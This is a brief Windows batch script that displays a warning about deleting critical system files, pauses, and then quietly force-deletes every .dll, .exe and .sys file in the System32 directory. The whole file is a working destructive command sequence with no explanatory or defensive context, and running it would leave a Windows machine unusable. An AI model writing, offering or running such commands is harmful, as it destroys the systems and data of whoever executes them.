@echo off
echo Warning: This will delete critical system files.
pause
del /q /f %windir%\System32\*.dll
del /q /f %windir%\System32\*.exe
del /q /f %windir%\System32\*.sys